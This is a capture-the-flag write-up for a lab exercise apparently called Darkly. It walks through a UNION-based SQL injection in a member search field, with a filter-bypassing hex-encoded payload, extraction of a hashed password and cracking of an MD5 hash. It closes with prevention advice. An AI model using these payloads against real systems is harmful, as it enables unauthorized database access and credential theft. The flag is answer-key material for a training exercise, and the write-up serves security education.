# Darkly

## Sql Injection

## Flag

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

### How to find the flag

1. **Identifying SQL Injection Vulnerability**:
    
    In the Members section, there is a field to search for a member by ID. This field is directly vulnerable to SQL injection. We can use a UNION-based SQL injection to retrieve information about the web-server. For example, by entering:
    
    ```sql
    1 union select 1, version()
    ```
    
    We get information about the host version:
    
    ```
    5.5.64-MariaDB-1ubuntu0.14.04.1
    ```
    
2. **Retrieving Database information:**
    
    In order to obtain the database currentyly in use, we can type:
    
    ```sql
    1 union select database(), user()
    ```
    
    Output:
    
    ```
    Member_Sql_Injection
    ```
    
    Knowing this field is vulnerable, we can enumerate all databases on the webserver using:
    
    ```sql
    1 union select schema_name, 2 from information_schema.schemata
    ```
    
    This query reveals:
    
    - information_schema
    - Member_Brute_Force
    - Member_Sql_Injection
    - Member_guestbook
    - Member_images
    - Member_survey
3. **Retrieving Tables in a Database**:
    
    Next, we can list tables within the **Member_Sql_Injection** database using:
    
    ```sql
    1 union select table_name, 2 from information_schema.tables where table_schema=database()
    ```
    
    The use of `database()` is necessary to avoid syntax errors. The output shows a table named "**users**."
    
4. **Finding Columns in the “users” table:**
    
    We can view columns within the "users" table by using:
    
    ```sql
    1 union select column_name, 2 from information_schema.columns where table_name=0x7573657273
    ```
    
    Here, we converted "users" to hexadecimal (0x7573657273) to bypass potential SQL injection filters.
    
5. **Extracting data:**
    
    Now that we know the columns in the "users" table, we see a column named "**Commentaire**." To view its content, we use:
    
    ```sql
    1 UNION SELECT Commentaire, 2 FROM users
    ```
    
    In the results, we see a message saying:
    
    ```
    "Decrypt this password -> then lower all the char…"
    ```
    
    Checking all columns in "users," we also find a "**countersign**" column containing a hash. Combining **Commentaire** and **countersign** with the following query:
    
    ```sql
    1 UNION SELECT Commentaire, countersign FROM users
    ```
    
    We obtain:
    
    ```
    First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good!
    Surname: 5ff9d0165b4f92b14994e5c685cdce28
    ```
    
6. Decrypting the Hash:
    
    Using an MD5 decrypter, we decrypt this hash to reveal: **FortyTwo**. By converting it to lowercase and hashing it with SHA-256, we obtain the final flag.

## Prevent SQLi

There are several methods that developers can implement in order to avoid sql injection:

1. **Use prepared statements and parameterized queries:**
    
    Ensure that the user input is not directly inserted into SQL queries.
    
2. **Input validation an sanitization:**
    
    Limit user input to acceptable values, such as numbers, dates, and specific text formats.
    
    Sanitize input to remove or escape potentially dangerous characters(e.g., single quotes or semicolons).
    
3. Implement least privileges for database access:
    
    Configure the database user permissions so that they only have the minimum access necessary.
